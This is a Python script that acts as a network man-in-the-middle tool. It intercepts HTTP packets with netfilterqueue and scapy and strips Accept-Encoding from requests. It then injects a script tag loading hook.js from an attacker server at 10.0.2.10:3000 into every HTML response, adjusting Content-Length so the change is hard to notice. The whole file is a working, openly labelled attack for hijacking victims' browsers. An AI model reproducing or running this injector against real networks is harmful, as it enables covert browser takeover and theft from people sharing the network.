import netfilterqueue
import scapy.all as scapy
import argparse
import subprocess
from dns_spoof import set_ip_tables
import re


INJ_CODE = '<script src="http://10.0.2.10:3000/hook.js"></script>'


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument('-q', '--queue-local-forward', dest="queue", help='Queue [local/forward]')
    parser.add_argument('-n', '--queue-num', dest="queue_n", help='Queue num')
    options_from_parser = parser.parse_args()
    if not options_from_parser.queue:
        parser.error('[-] Please specify if queue is local or forward, use --help for more info.')
    if not options_from_parser.queue_n:
        parser.error('[-] Please specify a queue num, use --help for more info.')

    return options_from_parser


def set_load(packet, payload_string):
    packet[scapy.Raw].load = payload_string
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum

    return packet


def calc_content_length(load, difference):
    content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
    if content_length_search and "text/html" in load:
        content_length = content_length_search.group(1)
        new_content_length = int(content_length) + difference
        load = load.replace("Content-Length: " + content_length, "Content-Length: " + str(new_content_length))
    return load


def inject_code(load, inj_code):
    load = load \
        .replace(inj_code, "")\
        .replace("</body>", inj_code + "</body>")

    load = calc_content_length(load, len(inj_code))
    return load


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())

    if scapy_packet.haslayer(scapy.Raw):
        load = scapy_packet[scapy.Raw].load.decode()

        if scapy_packet[scapy.TCP].dport == 80:
            print('[+] Request')
            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
        elif scapy_packet[scapy.TCP].sport == 80:
            print('[+] Response')
            load = inject_code(load, INJ_CODE)
            print(load)

        if load != scapy_packet[scapy.Raw].load.decode():
            modified_packet = set_load(scapy_packet, load)
            packet.set_payload(bytes(modified_packet))

    packet.accept()


def start_attack(queue_num, queue_local_forward):
    if not set_ip_tables(queue_num, queue_local_forward):
        print('[-] Iptables settings fails ' + queue_num + ' ' + queue_local_forward)
        return False

    queue = netfilterqueue.NetfilterQueue()
    queue.bind(int(queue_num), process_packet)
    queue.run()


if __name__ == "__main__":
    options = get_arguments()
    try:
        start_attack(options.queue_n, options.queue)
    except KeyboardInterrupt:
        print('\n[+] Detected CTRL + C, quitting...')
        subprocess.call(['sudo', 'iptables', '--flush'])
        print('[+] Attack ended!')
